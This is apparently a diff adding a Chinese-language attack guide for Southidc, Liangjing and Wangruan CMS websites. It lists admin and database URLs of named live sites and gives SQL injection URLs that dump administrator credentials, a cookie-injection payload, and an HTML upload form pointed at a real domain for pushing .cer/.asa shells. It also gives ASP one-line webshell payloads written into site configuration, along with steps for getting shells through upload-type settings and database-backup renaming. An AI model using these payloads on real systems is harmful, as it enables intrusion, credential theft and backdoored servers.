@@ -1,0 +1,113 @@
+http://www.netknight.in/admin/southidceditor/datas/southidceditor.mdb
+
+http://www.netknight.in/admin/southidceditor/admin/admin_login.asp
+
+http://www.netknight.in/admin/southidceditor/popup.asp
+
+http://www.netknight.in/admin/southidceditor/login.asp
+
+http://www.netknight.in/admin/Southidceditor/admin_style.asp?action=copy&id=14
+http://www.netknight.in/admin/SouthidcEditor/Admin_Style.asp?action=styleset&id=47
+http://www.netknight.in/admin/Southidceditor/ewebeditor.asp?id=57&style=southidc
+1.注入点:news_search.asp?key=7%' union select 0,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9 from admin where 1 or '%'='&otype=title&Submit=%CB%D1%CB%F7
+
+ 
+也可能是(另外一个版本)news_search.asp?key=7%' union select 0,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9,10 from admin where 1 or '%'='&otype=title&Submit=%CB%D1%CB%F7
+ 
+直接暴管理员帐号密码(md5)
+ 
+2.登陆后台
+ 
+3.利用编辑器上传:
+ 
+访问admin/southidceditor/admin_style.asp
+ 
+修改编辑器样式,增加asa(不要asp).然后直接后台编辑新闻上传.
+ 
+========================================
+ 
+参考资料整理:
+ 
+南方数据、良精系统、网软天下漏洞利用
+www.hx99.net     时间: 2009-12-18     阅读: 28次      整理: 华西安全网1、通过upfile_other.asp漏洞文件直接取SHELL
+ 
+直接打开userreg.asp进行注册会员，进行登录，（在未退出登录的状态下）使用本地上传文件进行上传代码如下：
+ 
+<HTML><HEAD>   
+<META http-equiv=Content-Type content="text/html; charset=gb2312">   
+<STYLE type=text/css>BODY {   
+FONT-SIZE: 9pt; BACKGROUND-COLOR: #e1f4ee   
+}   
+.tx1 {   
+BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: #000000 1px solid; COLOR: #0000ff; BORDER-BOTTOM: #000000 1px solid; HEIGHT: 20px   
+}   
+</STYLE>
+ 
+<META content="MSHTML 6.00.2800.1400" name=GENERATOR></HEAD>   
+<BODY leftMargin=0 topMargin=0>   
+<FORM name=form1 action="http://www.huobaodidai.cn/upfile_Other.asp"; method=post   
+encType=multipart/form-data><INPUT class=tx1 type=file size=30 name=FileName> <INPUT class=tx1 type=file size=30 name=FileName1> <INPUT xxxxx="BORDER-RIGHT: rgb(88,88,88) 1px double; BORDER-TOP: rgb(88,88,88) 1px double; FONT-WEIGHT: normal; FONT-SIZE: 9pt; BORDER-LEFT: rgb(88,88,88) 1px double; LINE-HEIGHT: normal; BORDER-BOTTOM: rgb(88,88,88) 1px double; FONT-STYLE: normal; FONT-VARIANT: normal" type=submit value=上传 name=Submit>   
+<INPUT id=PhotoUrlID type=hidden value=0 name=PhotoUrlID> </FORM></BODY></HTML>
+ 
+将以上代码保存为html格式，替换代码中的网址，第一个框里选择图片文件，第二个框选择.cer、.asa或asp文件上传（后面需要加一个空格，貌似在IE8中进行使用不能后面加空格，加空格时就弹出选择文件对话框，我是找不到解决办法）。
+ 
+注：此方法通杀南方数据、良精系统、网软天下等
+ 
+2、通过注入秒杀管理员帐号密码，使用如下：
+ 
+http://www.huobaodidai.cn/NewsType.asp?SmallClass=’%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20’’=’
+ 
+以上代码直接暴管理员帐号和密码，取SHELL方法如下：
+ 
+在网站配置[http://www.target.com/admin/SiteConfig.asp]的版权信息里写入 "%><%eval(request(chr(35)))%><%’
+ 
+成功把shell写入http://www.target.com/inc/config.asp
+ 
+这里一句话chr(32)密码是“#”
+ 
+3、cookie注入
+ 
+清空地址栏，利用union语句来注入，提交：
+ 
+javascript:alert(document.cookie="id="+escape("1 and 1=2 union select 1,username,password,4,5,6,7,8,9,10 from Admin"))
+ 
+如果你牛你就手工，反正我是不会，用刺猬大哥的“cookie注入转换工具”方便又迅速何乐而不为？
+ 
+注：貌似南方数据、良精系统、网软天下等系统也都存在COOKIE注入。
+ 
+（当然南方不只有上面三个漏洞，还有几个漏洞貌似不常用，反正我给我常用的总结出来希望对大家有帮助）
+ 
+三、后台取SHELL方法总结
+ 
+（1）在系统管理中的网站配置中插入一句话马：进入后台后,点左边的”系统管理”再点击”网站配置”在右边的”网站名称”(也可以在其它处)后加入"%><%Eval(Request(chr(112)))%><%’，再点保存配置，如图：
+ 
+然后我们打开inc/config.asp文件，看到一句话马已写入到配置文件中了，
+ 
+这时再打开一句话马的客户端,提交同样得到一个小马
+ 
+(注:以下均在其它网站上测试所截的图，为防止信息泄漏，未截留网站连接，请谅解！)
+ 
+（2）后台上传漏洞,在Upfile_Photo.asp文件中部分代码片段如下：
+ 
+if fileEXT="asp" or fileEXT="asa" or fileEXT="aspx" then
+                    EnableUpload=false
+ end if
+               if EnableUpload=false then
+                      msg="这种文件类型不允许上传！nn只允许上传这几种文件类型：" & UpFileType
+                      FoundErr=true
+               end if
+ 
+大家可以看到程序只限制了对"asp"，"asa","aspx"类的文件上传，我们只要在”网站配置”的允许的上传文件类型处增加上传“cer“等被服务器可解析的文件类型就可，如图：
+ 
+ 
+提交时却显示下载页面 ,上传其它如”htr,cdx”等后缀文件时,提交时服务器却不请求(只能说运气不好吧)
+ 
+（3）后台备份,直接在”产品管理”下的添加产品中上传jpg后缀的asp马,再到”系统管理”下的数据库备份,在”当前数据库路径”栏填入上传的路径,在” 备份数据库名称”填入你要备份马的名称,不过系统会在名称后自动添加上.asa的
+ 
+点”确定”后提示”备份数据库成功….”不过实际文件是没有.asa的
+ 
+直接访问备份后的地址,就得到一个webshell
+ 
+ 
+（以上虽用网软做的后台演示，但南方和良精后台取shell都是大同小异的）
+
